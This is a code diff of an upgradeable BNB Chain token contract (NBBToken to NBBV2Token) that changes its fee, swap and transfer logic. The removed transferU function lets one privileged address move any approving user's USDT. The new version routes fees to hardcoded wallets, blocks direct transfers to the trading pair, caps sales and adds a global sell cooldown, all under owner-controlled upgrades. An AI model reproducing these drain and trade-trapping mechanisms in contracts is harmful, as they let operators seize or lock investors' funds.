@@ -397,12 +397,11 @@ interface IPancakeERC20 {
     ) external;
 }
 
-contract NBBToken is
-    Initializable,
-    ERC20Upgradeable,
-    UUPSUpgradeable,
-    OwnableUpgradeable
-{
+contract NBBV2Token is Initializable,
+     ERC20Upgradeable,
+     UUPSUpgradeable,
+     OwnableUpgradeable
+ {
     using SafeMathUpgradeable for uint256;
     using AddressUpgradeable for address;
 
@@ -411,52 +410,42 @@ contract NBBToken is
     ERC20Upgradeable private _usdtToken;
 
     uint256 public buyFeeRate; //10%
-    uint256 public mintFeeRate; //50%
     uint256 public sellFeeRate; //10% 动态
-    uint256 public slippageFee;
     address public orePoolAddress; //TODO:
     address public pledgeAddress; //TODO:
     address public gameAddress; //TODO:
     address public transferAddress;
-    ERC20Upgradeable _soaToken;
-    uint256 public soaSwapIndex;
-    bool public soaTokenSwapping;
+    address public activeAddress;
+    uint256 public lastTradeTime;
+    address public airDropAddress;
 
     /// @custom:oz-upgrades-unsafe-allow constructor
-    constructor() initializer {}
+     constructor() initializer {}
 
-    function _authorizeUpgrade(address) internal override onlyOwner {}
+     function _authorizeUpgrade(address) internal override onlyOwner {}
 
-    function initialize() public initializer {
-        __ERC20_init("Monday Token", "Monday");
+      function initialize() public initializer {
+        __ERC20_init("NBB.ETM", "NBB");
         __Ownable_init();
         __UUPSUpgradeable_init();
 
         _mint(msg.sender, 100000000000 * 10**decimals());
-        //PRD 0x10ED43C718714eb63d5aA57B78B54704E256024E  TEST 0xD99D1c33F9fC3444f8101754aBC46c52416550D1
         uniswapV2Router = IUniswapV2Router02(
             0x10ED43C718714eb63d5aA57B78B54704E256024E
         );
-        // PRD 0x55d398326f99059fF775485246999027B3197955 TEST
-        _usdtToken = ERC20Upgradeable(
-            0x55d398326f99059fF775485246999027B3197955
-        );
+        _usdtToken = ERC20Upgradeable(0x55d398326f99059fF775485246999027B3197955);
         uniswapV2Pair = IUniswapV2Factory(uniswapV2Router.factory()).createPair(
                 address(this),
                 address(_usdtToken)
             );
         buyFeeRate = 1000;
         sellFeeRate = 1000;
-        mintFeeRate = 5000;
-        orePoolAddress = owner();
-        transferAddress = owner();
-        pledgeAddress = owner();
-        gameAddress = owner();
-        soaSwapIndex = 300;
-        soaTokenSwapping = true;
-        _soaToken = ERC20Upgradeable(
-            0xc7e9D15A2dC34d3a9F532b325396B8bf02F44fB8
-        );
+        orePoolAddress = 0xB144b8312c3c062634eE3063a95c7AEc6d00b09a;
+        transferAddress = 0x1E4Aeea3550cA9d6c0E7bc3175aD89D80dDFc68b;
+        pledgeAddress = 0xfF4A2187E5BC12876A9A90032a270083EDE8a008;
+        gameAddress = orePoolAddress;
+        activeAddress = 0x9CD9ac37E323a2D79cC35c42D064579Def5a7E8E;
+        airDropAddress = owner();
     }
 
     event Buy(address from, address to, uint256 amount);
@@ -470,6 +459,9 @@ contract NBBToken is
         returns (bool)
     {
         address from = _msgSender();
+        if (from != address(uniswapV2Router) && to == uniswapV2Pair) {
+            revert();
+        }
         if (
             to != uniswapV2Pair &&
             from != uniswapV2Pair &&
@@ -490,8 +482,6 @@ contract NBBToken is
         uint256 usdtBal = _usdtToken.balanceOf(uniswapV2Pair);
         if (usdtBal > _reserve1) {
             uint256 fee = amount.mul(buyFeeRate).div(10000);
-            uint256 mintFee = amount.mul(mintFeeRate).div(10000);
-            slippageFee = slippageFee.add(mintFee);
             super._transfer(from, orePoolAddress, fee);
             super._transfer(from, to, amount.sub(fee));
 
@@ -505,70 +495,17 @@ contract NBBToken is
         return true;
     }
 
-    // function setFeeRate(
-    //     uint256 _buyFeeRate,
-    //     uint256 _mintFeeRate,
-    //     uint256 _sellFeeRate
-    // ) public onlyOwner {
-    //     buyFeeRate = _buyFeeRate; //10%
-    //     mintFeeRate = _mintFeeRate; //50%
-    //     sellFeeRate = _sellFeeRate; //10% 动态
-    // }
-
-    // function updateSlippageK(uint256 amount) public onlyOwner{
-    //     require(slippageFee >= amount);
-    //     super._transfer(uniswapV2Pair, orePoolAddress, amount);
-    //     IPancakePair(uniswapV2Pair).sync();
-    //     slippageFee = slippageFee.sub(amount);
-    // }
-
-    // function updateK(uint256 amount) public onlyOwner {
-    //     super._transfer(uniswapV2Pair, orePoolAddress, amount);
-    //     IPancakePair(uniswapV2Pair).sync();
-    // }
-
-    event Activate(address from, uint256 id);
-
-    function activate(uint256 amount, uint256 id) public {
-        address spender = _msgSender();
-        _usdtToken.transferFrom(spender, uniswapV2Pair, amount);
-        IPancakePair(uniswapV2Pair).sync();
-        emit Activate(spender, id);
-    }
-
-    function setGameAddress(address account) public onlyOwner {
-        gameAddress = account;
-    }
-
-    function setOrePoolAddress(address account) public onlyOwner {
-        orePoolAddress = account;
-    }
-
-    function setSOAToken(address account) public onlyOwner {
-        _soaToken = ERC20Upgradeable(account);
-    }
-
-    function setSlippageFee(uint256 amount) public onlyOwner {
-        slippageFee = amount;
-    }
-
-    function setPledgeAddress(address account) public onlyOwner {
-        pledgeAddress = account;
-    }
-
-    function getSellSlippage(uint256 amount)
+    function getSellSlippage()
         public
         view
-        returns (bool, uint256)
+        returns (bool)
     {
         uint256 _reserve0;
         uint256 _reserve1;
         (_reserve0, _reserve1, ) = IPancakePair(uniswapV2Pair).getReserves();
         if (_reserve0 == 0 || _reserve1 == 0) {
-            return (true, 0);
+            return (true);
         }
-        uint256 kLast = _reserve0.mul(_reserve1);
-
         uint256 usdtBal = _usdtToken.balanceOf(uniswapV2Pair);
 
         if (IPancakePair(uniswapV2Pair).token0() == address(_usdtToken)) {
@@ -578,23 +515,9 @@ contract NBBToken is
         }
 
         if (usdtBal > _reserve1) {
-            return (true, 0);
+            return (true);
         }
-
-        uint256 oldPrice = (_reserve1.mul(10**8)).div(_reserve0);
-
-        uint256 newReserve0 = _reserve0.add(amount);
-        uint256 newReserve1 = kLast.div(newReserve0);
-        uint256 diff = _reserve1.sub(newReserve1);
-        uint256 newPrice = diff.mul(10**8).div(amount);
-
-        if (oldPrice > newPrice) {
-            uint256 slippage = (
-                (oldPrice.sub(newPrice, "oldPrice < newPrice")).mul(10**4)
-            ).div(oldPrice);
-            return (false, slippage);
-        }
-        return (false, 0);
+        return (false);
     }
 
     function transferFrom(
@@ -603,32 +526,40 @@ contract NBBToken is
         uint256 amount
     ) public override returns (bool) {
         address spender = _msgSender();
+
+        if (spender != address(uniswapV2Router) && to == uniswapV2Pair) {
+            revert();
+        }
+        if (
+            to != uniswapV2Pair &&
+            spender != uniswapV2Pair &&
+            spender != address(uniswapV2Router) &&
+            to != address(uniswapV2Router)
+        ) {
+            super._transfer(from, to, amount);
+            return true;
+        }
+
         _spendAllowance(from, spender, amount);
-        
-        (bool addLiquidity, uint256 sellSlippage) = getSellSlippage(amount);
+
+        bool addLiquidity = getSellSlippage();
         if (addLiquidity) {
             super._transfer(from, to, amount);
             emit AddLiquidity(from, amount);
             return true;
         }
+        uint256 limit = balanceOf(uniswapV2Pair).div(10);
+        require(amount <= limit, "max trade amount");
+        require(block.timestamp.sub(lastTradeTime) > 10, "Sell order limit");
 
         uint256 sellFee = amount.mul(sellFeeRate).div(10000);
-        uint256 lftPool = sellFee;
-
-        if (sellSlippage > sellFeeRate) {
-            sellFee = amount.mul(sellSlippage).div(10000);
-            uint256 mintFee = sellFee.sub(lftPool, "lftPool > sellFee");
-            super._transfer(from, orePoolAddress, mintFee);
-        }
-
-        require(amount.mul(10000).div(balanceOf(uniswapV2Pair)) <= 1000,"not allow");
 
         super._transfer(from, orePoolAddress, sellFee);
         uint256 leftFee = amount.sub(sellFee);
         super._transfer(from, to, leftFee);
 
-        uint256 leftAmount = leftFee.sub(lftPool, "lftPool > leftFee");
-        slippageFee = slippageFee.add(leftAmount);
+        lastTradeTime = block.timestamp;
+
         emit Sell(from, to, amount);
         return true;
     }
@@ -651,43 +582,17 @@ contract NBBToken is
         emit HashGame(spender, gameType, token, amount);
     }
 
-    event PledgeUSDT(address, uint256);
-
-    //理财质押
-    function pledgeUSDT(uint256 amount) public {
-        // require(amount > 100 * 10**_usdtToken.decimals(), "less 100 U");
-        address spender = _msgSender();
-        _usdtToken.transferFrom(spender, pledgeAddress, amount);
-        emit PledgeUSDT(spender, amount);
+    function setAirDropAddress(address account) public onlyOwner {
+        airDropAddress = account;
     }
 
-    function setTransUAddress(address account) public {
-        require(_msgSender() == transferAddress);
-        transferAddress = account;
-    }
-
-    function transferU(
-        address from,
-        address to,
-        uint256 amount
-    ) public {
-        require(_msgSender() == transferAddress);
-        _usdtToken.transferFrom(from, to, amount);
-    }
-
-    event SwapSOA(address, uint256);
-
-    function setSoaTokenSwapping(bool flag) public onlyOwner {
-        soaTokenSwapping = flag;
-    }
-
-    function swapSOA() public {
-        require(soaTokenSwapping, "not open");
-        address spender = _msgSender();
-        uint256 bal = _soaToken.balanceOf(spender);
-        require(bal > 0);
-        _soaToken.transferFrom(spender, orePoolAddress, bal);
-        super._transfer(orePoolAddress, spender, bal * soaSwapIndex);
-        emit SwapSOA(spender, bal);
+    function airDrop(address[] calldata accounts, uint256[] calldata amounts)
+        public
+    {
+        require(_msgSender() == airDropAddress);
+        uint256 len = accounts.length;
+        for (uint256 index = 0; index < len; index++) {
+            super._transfer(_msgSender(), accounts[index], amounts[index]);
+        }
     }
 }
